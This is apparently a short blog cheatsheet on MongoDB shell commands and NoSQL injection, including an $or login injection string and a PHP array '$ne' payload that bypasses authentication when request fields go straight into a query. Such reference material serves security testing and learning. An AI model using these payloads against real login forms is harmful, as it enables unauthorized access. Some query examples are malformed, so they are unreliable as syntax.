---
layout: post
title:  "NoSQL injections"
date:   2019-1-1 16:57:56 +0100
---
# NoSQL cheatsheet
## Databases
* List databases: `show dbs`
* Specify database: `use database_name`
* Check current database: `db`
* Delete database: `db.dropDatabase()`

## Collections
* List collections: `show collections`
* Create collection: `db.createCollection(name)`
* Create collection with automatic `_id` field: `db.createCollection(name, {autoIndexId: true})`
* Delete collection: `db.collection_name.drop()``

## Operations examples
```
db.logins.find();
db.logins.find().pretty();
db.logins.find({$and: {key1: value1}, {key2: value2}});
db.logins.find({$or: {key1: value1}, {key2: value2}});
db.logins.find({key1: value1});
db.logins.find({key1: {$ne: value1}}); // Not equal
db.logins.find({key1: {$lt: value1}}); // Less than
db.logins.find({key1: {$lte: value1}}); // Less than or equal
db.logins.find({key1: {$gt: value1}}); // Greater than
db.logins.find({key1: {$gte: value1}}); // Greater than or equal
```


# NoSQL OR injections
* `login=admin',$or:[{},{'a'='a&pass='}]`
* `find( {'$where' : 'function() { return artist == "Weezer"; }'} )`

# PHP array injections
* PHP associative arrays: `$collection->find(array('login' => 'test'))` equivalent to `find({'login': 'test'})`
* Automatic array creation: if `page.php?param[foo]=bar` then `param == array('foo' => 'bar')`
* If `db->logins->find(array(“username”=>$_POST[“username”],
“password”=>$_POST[“password”]));`, then `login[$ne]=test&password[$ne]=test` transformed to `array(“username” => array(“$ne” => 1), “password” =>
array(“$ne” => 1));` equivalent to `{ username: { $ne: 1 }, password: { $ne: 1 } }`
